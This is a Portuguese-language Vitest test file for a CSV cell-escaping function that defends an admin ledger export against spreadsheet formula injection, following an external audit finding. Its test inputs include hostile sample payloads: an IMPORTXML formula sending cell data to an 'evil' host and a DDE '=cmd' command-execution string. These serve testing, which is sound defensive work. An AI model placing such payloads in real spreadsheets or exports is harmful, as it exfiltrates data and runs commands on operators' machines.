/**
 * ⚠️⚠️ ENTRADA ANÔNIMA CHEGAVA AO CSV ADMINISTRATIVO COMO FÓRMULA.
 * Achado A29 da auditoria externa.
 *
 * O escape antigo citava aspas, vírgulas e `\n` — o bastante para o arquivo ser
 * LIDO certo. Só que Excel, Google Sheets e LibreOffice não apenas leem: eles
 * AVALIAM. Uma célula que começa com `=`, `+`, `-`, `@`, TAB ou CR vira fórmula
 * ao abrir.
 *
 * ⚠️ E O CONTEÚDO NÃO É NOSSO: `logOperation` grava `pair` vindo de cartão de
 * LLM e `route` de texto livre. O exportador entrega isso para a planilha de
 * quem opera a plataforma — a máquina com mais acesso da casa.
 */
import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { csvCell } from "./csv";

const ROTA = readFileSync(join(process.cwd(), "src/app/admin/api/ledger/export/route.ts"), "utf8");

describe("① a planilha não avalia o que veio de fora", () => {
  it("⚠️⚠️ os cinco caracteres que abrem fórmula são neutralizados", () => {
    for (const abre of ["=", "+", "-", "@", "\t", "\r"]) {
      const saida = csvCell(`${abre}HYPERLINK("http://x")`);
      expect(saida.startsWith("\"'") || saida.startsWith("'"), `${JSON.stringify(abre)} passou`).toBe(true);
    }
  });

  it("⚠️⚠️ o ataque real: exfiltração por HYPERLINK / IMPORTXML", () => {
    expect(csvCell('=IMPORTXML("http://evil/"&A1,"//x")')).toMatch(/^"'=IMPORTXML/);
    expect(csvCell('=cmd|\'/c calc\'!A0')).toMatch(/^"?'=cmd/);
  });

  it("⚠️ o dado continua LEGÍVEL — não se apaga o caractere", () => {
    // Remover o `=` falsificaria o extrato: o registro passaria a dizer outra
    // coisa que aconteceu. O apóstrofo marca "isto é texto" sem mentir.
    expect(csvCell("=BTC/USDT")).toContain("=BTC/USDT");
  });

  it("valor comum passa sem adorno", () => {
    expect(csvCell("BTC/USDT")).toBe("BTC/USDT");
    expect(csvCell(42)).toBe("42");
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
  });
});

describe("② e o escape para o PARSER continua certo — agora completo", () => {
  it("aspas viram aspas duplas dentro de campo citado", () => {
    expect(csvCell('diz "oi"')).toBe('"diz ""oi"""');
  });

  it("vírgula e quebra de linha são citadas", () => {
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell("a\nb")).toBe('"a\nb"');
  });

  it("⚠️⚠️ `\\r` SOZINHO também — a versão antiga quebrava a linha do CSV", () => {
    // O regex antigo era /[",\n]/: um CR sem LF saía sem aspas, e leitores que
    // tratam CR como fim de registro partiam a linha ao meio.
    expect(csvCell("a\rb")).toBe('"a\rb"');
  });
});

describe("③ e a rota usa a função compartilhada", () => {
  it("⚠️ a cópia inline saiu — duas versões do mesmo escape é a porta dos fundos", () => {
    expect(ROTA).toMatch(/import \{ csvCell \} from "@\/lib\/admin\/csv"/);
    expect(ROTA).not.toMatch(/function csvCell\(/);
  });

  it("toda coluna passa por ela", () => {
    expect(ROTA).toMatch(/COLS\.map\(\(c\) => csvCell\(r\[c\]\)\)\.join\(","\)/);
  });
});
